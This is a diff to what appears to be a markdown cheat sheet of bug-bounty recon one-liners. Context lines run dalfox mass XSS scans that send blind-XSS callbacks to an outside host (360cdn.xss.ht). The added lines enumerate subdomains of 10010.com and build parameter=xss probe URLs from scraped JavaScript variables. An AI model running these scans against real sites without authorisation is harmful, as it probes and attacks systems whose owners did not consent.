@@ -176,6 +176,10 @@ dalfox file 200_all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  --deep-domxss   -o final_xss.txt
 dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
+
+
+1.subfinder -d 10010.com | httpx | tee 10010.txt
+2.echo "http://m.client.10010.com" | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars";done | tee 10010.out
 ```
 
 
